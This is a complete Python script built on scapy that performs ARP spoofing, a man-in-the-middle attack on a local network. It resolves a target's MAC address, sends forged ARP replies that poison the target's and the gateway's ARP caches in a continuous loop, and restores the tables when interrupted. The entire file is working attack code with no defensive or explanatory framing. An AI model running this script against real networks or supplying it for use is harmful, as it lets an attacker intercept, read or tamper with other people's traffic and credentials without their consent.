import scapy.all as scapy
import time


# Get MAC address of a target IP
def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except IndexError:
        # print("[-] Failed to get MAC address for the target IP. Make sure the target is online.")
        return None


# Perform ARP spoofing to redirect traffic
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)


# Restore ARP tables after ARP spoofing attack
def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    if dest_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)


# ARP spoofing attack
def arp_spoof(target_ip, spoof_ip):
    try:
        while True:
            spoof(target_ip, spoof_ip)
            spoof(spoof_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Stopping the ARP spoofing attack...")
        restore(target_ip, spoof_ip)
        print("[+] ARP tables restored.")

